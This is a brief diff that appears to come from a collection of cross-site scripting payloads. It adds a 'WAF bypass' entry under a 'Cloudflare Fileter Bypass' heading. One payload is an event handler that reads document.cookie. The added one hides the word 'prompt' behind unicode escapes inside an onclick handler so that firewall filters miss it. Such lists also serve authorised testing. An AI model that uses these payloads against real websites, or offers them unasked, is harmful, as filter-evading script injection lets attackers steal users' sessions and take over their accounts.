@@ -30,6 +30,9 @@ Cloudflare Fileter Bypass:
 
           "><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>
 
+         WAF bypass :
+
+         <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
 
 
 
